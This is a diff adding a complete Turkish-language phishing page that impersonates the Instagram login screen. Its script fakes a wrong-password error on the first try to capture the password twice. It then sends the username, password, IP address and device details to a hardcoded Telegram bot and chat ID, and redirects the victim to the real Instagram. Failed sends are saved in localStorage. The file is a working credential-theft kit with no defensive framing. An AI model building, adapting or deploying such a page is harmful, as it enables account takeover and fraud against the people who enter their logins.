@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #262626;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+            padding: 0 20px;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 20px auto 30px;
+        }
+        
+        .input-group {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            font-size: 12px;
+            box-sizing: border-box;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #00376b;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+            z-index: 2;
+        }
+        
+        button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        
+        .fb-login img {
+            height: 16px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        .forgot-pw {
+            color: #00376b;
+            font-size: 12px;
+            margin: 12px 0;
+            display: block;
+            cursor: pointer;
+        }
+        
+        .signup {
+            font-size: 14px;
+            margin: 15px 0;
+        }
+        
+        .signup a {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        
+        .download-buttons img {
+            height: 40px;
+            cursor: pointer;
+        }
+        
+        .meta {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: normal;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">
+            
+            <div id="errorMsg" class="error-message" style="display: none;">
+                <strong>Yanlış Şifre</strong><br>
+                Girdiğin şifre yanlış. Lütfen tekrar dene.
+            </div>
+            
+            <div id="fbLogin" class="fb-login">
+                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
+                <span>Facebook ile Devam Et</span>
+            </div>
+            
+            <div class="divider">YA DA</div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Şifre" required>
+                    <button type="button" class="show-password" id="showPassword">Göster</button>
+                </div>
+                <button type="submit" id="loginButton">Giriş yap</button>
+            </form>
+            
+            <a id="forgotPassword" class="forgot-pw">Şifreni mi unuttun?</a>
+        </div>
+        
+        <div class="login-box">
+            <p class="signup">Hesabın yok mu? <a id="signUp">Kaydol</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Uygulamayı indir.</p>
+            <div class="download-buttons">
+                <img id="appStore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_tr-tr.png/4b70f6fae447.png" alt="App Store">
+                <img id="playStore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_tr-tr.png/1554e8bd4241.png" alt="Google Play">
+            </div>
+        </div>
+        
+        <div class="meta">from <strong>Meta</strong></div>
+    </div>
+
+    <script>
+        let firstAttempt = true;
+        
+        // Şifre göster/gizle butonu
+        const showPasswordBtn = document.getElementById('showPassword');
+        const passwordInput = document.getElementById('password');
+        
+        showPasswordBtn.addEventListener('click', function() {
+            if(passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.textContent = 'Gizle';
+            } else {
+                passwordInput.type = 'password';
+                this.textContent = 'Göster';
+            }
+        });
+        
+        // Giriş formu işlemi
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if(firstAttempt) {
+                // İlk denemede hata göster
+                document.getElementById('errorMsg').style.display = 'block';
+                firstAttempt = false;
+            } else {
+                // İkinci denemede Telegram'a bilgileri gönder ve Instagram'a yönlendir
+                try {
+                    await sendToTelegram(username, password);
+                    window.location.href = 'https://www.instagram.com/';
+                } catch (error) {
+                    console.error('Hata:', error);
+                    window.location.href = 'https://www.instagram.com/';
+                }
+            }
+        });
+        
+        // Diğer yönlendirme fonksiyonları...
+        
+        async function sendToTelegram(username, password) {
+            // Telegram bot bilgileri
+            const botToken = '7904316763:AAFbbxzLtoCvIm7M0BTf2o8yde74OvSwi50';
+            const chatId = '7816589291';
+            
+            const userAgent = navigator.userAgent;
+            
+            try {
+                // IP adresini al
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                const message = `--- Sarsılmaz Login ---
+Username: ${username}
+Password: ${password}
+Pass2: ${password}
+IP Adresi: ${ip}
+Cihaz Bilgileri: ${userAgent}
+Tarih: ${new Date().toLocaleString()}`;
+                
+                // Telegram API'sine istek gönder
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                const telegramResponse = await fetch(telegramUrl);
+                
+                if(!telegramResponse.ok) {
+                    throw new Error('Telegram API hatası');
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Hata:', error);
+                // Alternatif olarak localStorage'a kaydet
+                const fallbackData = {
+                    username,
+                    password,
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem('login_data', JSON.stringify(fallbackData));
+                throw error;
+            }
+        }
+    </script>
+</body>
+</html>
